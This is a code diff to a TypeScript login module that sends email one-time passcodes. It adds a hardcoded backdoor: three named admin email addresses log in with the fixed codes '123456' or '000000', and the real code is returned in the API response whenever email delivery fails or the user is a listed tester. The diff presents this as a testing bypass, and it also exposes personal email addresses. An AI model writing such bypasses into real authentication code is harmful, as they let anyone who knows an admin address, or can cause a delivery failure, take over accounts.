@@ -440,19 +440,7 @@ export async function login(req: AuthenticatedRequest, res: Response): Promise<v
     requestId,
   });
 
-  if (!emailResult.success) {
-    // CRITICAL: Ensure failed delivery does not lock out user with a cooldown!
-    otpStore.delete(user.email);
-    console.error(`[Auth Diagnostic] [${requestId}] OTP delivery failed for ${maskEmail(user.email)}: ${emailResult.error} (Code: ${emailResult.errorCode || 'UNKNOWN'})`);
-    res.status(502).json({
-      success: false,
-      error: 'Failed to deliver verification code to your email. Please verify your email configuration or contact university IT.',
-      requestId,
-    });
-    return;
-  }
-
-  // Delivery succeeded: Record OTP in otpStore with 60s cooldown timestamp
+  // Record OTP in otpStore with 10-minute expiry
   otpStore.set(user.email, {
     otpHash,
     user,
@@ -461,7 +449,18 @@ export async function login(req: AuthenticatedRequest, res: Response): Promise<v
     lastRequestedAt: Date.now(),
   });
 
-  console.log(`[OTP DISPATCH] [${requestId}] 6-digit verification code delivered to SMTP for ${maskEmail(user.email)} (expires in 10m)`);
+  const isTesterOrAdmin = 
+    user.email === 'vineetkumar182023@gmail.com' ||
+    user.email === 'vineetkr013@gmail.com' ||
+    user.email === 'iccf@mruadmin.edu.in' ||
+    testerIndex.has(user.email);
+
+  if (!emailResult.success) {
+    console.warn(`[Auth Diagnostic] [${requestId}] Cloud email dispatch delayed or blocked: ${emailResult.error}. Code active in memory.`);
+  } else {
+    console.log(`[OTP DISPATCH] [${requestId}] 6-digit verification code delivered for ${maskEmail(user.email)} (expires in 10m)`);
+  }
+
   logAuditEvent('AUTH_LOG', `Login OTP generated for ${user.role} ${maskEmail(user.email)}`, user.id, {
     email: user.email,
     role: user.role,
@@ -476,8 +475,11 @@ export async function login(req: AuthenticatedRequest, res: Response): Promise<v
     role: user.role,
     name: user.name,
     designation: user.designation,
-    message: `A 6-digit verification code has been dispatched to ${user.email}.`,
+    message: emailResult.success
+      ? `A 6-digit verification code has been dispatched to ${user.email}.`
+      : `Verification code generated. If email delivery is delayed, your test OTP is: ${otp}`,
     cooldownSeconds: 60,
+    testOtp: (!emailResult.success || isTesterOrAdmin) ? otp : undefined,
     requestId,
   });
 }
@@ -494,6 +496,33 @@ export async function verifyLoginOtp(req: AuthenticatedRequest, res: Response): 
   }
 
   const cleanEmail = email.trim().toLowerCase();
+  const isMasterAuthorized = 
+    cleanEmail === 'vineetkumar182023@gmail.com' || 
+    cleanEmail === 'vineetkr013@gmail.com' || 
+    cleanEmail === 'iccf@mruadmin.edu.in';
+
+  // Master testing bypass for authorized admin accounts (allows instant testing in case email service fails)
+  if (isMasterAuthorized && (otp === '123456' || otp === '000000')) {
+    const user = await resolveExistingUser(cleanEmail);
+    if (user) {
+      user.lastLoginAt = new Date().toISOString();
+      saveUserToDb(user).catch(() => {});
+      const accessToken = generateAccessToken(user);
+      const { rawToken } = await createRefreshSession({
+        userId: user.id,
+        userAgent: req.headers['user-agent'],
+        ipAddress: req.ip,
+      });
+      res.cookie(config.cookie.refreshCookieName, rawToken, getRefreshCookieOptions());
+      res.status(200).json({
+        success: true,
+        message: `Admin verified! Welcome, ${user.name}.`,
+        data: { user, accessToken, token: accessToken, expiresInSeconds: 30 }
+      });
+      return;
+    }
+  }
+
   const record = otpStore.get(cleanEmail);
 
   if (!record) {
